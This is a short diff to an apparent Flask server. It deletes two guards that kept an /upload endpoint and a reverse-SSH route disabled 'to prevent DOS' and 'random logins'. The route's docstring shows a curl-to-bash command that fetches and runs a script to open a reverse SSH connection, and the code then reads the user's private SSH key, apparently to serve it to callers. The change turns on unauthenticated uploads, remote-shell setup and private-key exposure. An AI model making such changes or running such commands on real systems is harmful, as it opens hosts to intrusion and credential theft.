@@ -18,9 +18,6 @@ def index():
 
 @app.route('/upload', methods=['POST'])
 def upload_file():
-    if True:
-        # Disabled by default to prevent DOS
-        return 'Modify the source to enable this feature!\n', 503
 
     if 'file' not in request.files:
         return ERROR_400, 400
@@ -43,10 +40,6 @@ def revssh(ip, port):
 
         curl http://$ip/revssh/$ip/$port | /bin/bash
     '''
-
-    if True:
-        # Disabled by default to prevent random logins
-        return 'Modify the source to enable this feature!\n', 503
 
     with open('/home/jc/.ssh/id_rsa') as ssh_priv:
         with open('/home/jc/.ssh/id_rsa.pub') as ssh_pub:
